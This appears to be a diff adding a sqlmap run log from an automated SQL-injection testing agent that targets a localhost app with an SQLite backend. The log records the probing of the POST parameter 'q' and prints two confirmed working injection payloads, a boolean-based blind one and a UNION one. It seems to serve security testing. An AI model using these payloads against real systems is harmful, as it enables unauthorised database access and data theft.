@@ -1,0 +1,58 @@
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.9.4#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:31:20 /2025-09-26/
+
+[12:31:25] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_Users_sqlmap' as the output directory
+[12:31:26] [INFO] testing connection to the target URL
+[12:31:26] [INFO] checking if the target is protected by some kind of WAF/IPS
+[12:31:26] [INFO] testing if the target URL content is stable
+[12:31:27] [INFO] target URL content is stable
+[12:31:27] [INFO] testing if POST parameter 'q' is dynamic
+[12:31:27] [WARNING] POST parameter 'q' does not appear to be dynamic
+[12:31:27] [WARNING] heuristic (basic) test shows that POST parameter 'q' might not be injectable
+[12:31:27] [INFO] testing for SQL injection on POST parameter 'q'
+[12:31:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[12:31:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[12:31:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[12:31:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[12:31:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[12:31:29] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[12:31:30] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[12:31:31] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[12:31:31] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[12:31:32] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
+[12:31:32] [INFO] POST parameter 'q' appears to be 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' injectable (with --code=200)
+it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (3) and risk (1) values? [Y/n] Y
+[12:31:32] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[12:31:32] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[12:31:32] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[12:31:32] [INFO] target URL appears to have 2 columns in query
+[12:31:32] [INFO] POST parameter 'q' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+POST parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 323 HTTP(s) requests:
+---
+Parameter: q (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
+    Payload: q=test' AND CASE WHEN 5301=5301 THEN 5301 ELSE JSON(CHAR(100,73,120,79)) END-- KApU
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: q=test' UNION ALL SELECT CHAR(113,118,122,118,113)||CHAR(106,80,68,68,100,120,120,120,104,104,115,113,117,111,109,87,121,115,119,107,97,106,108,76,68,77,117,70,106,69,110,81,100,121,97,120,105,115,75,76)||CHAR(113,106,118,122,113),NULL-- kQRI
+---
+[12:31:32] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[12:31:32] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 131 times
+[12:31:32] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_Users_sqlmap\localhost'
+
+[*] ending @ 12:31:32 /2025-09-26/
+
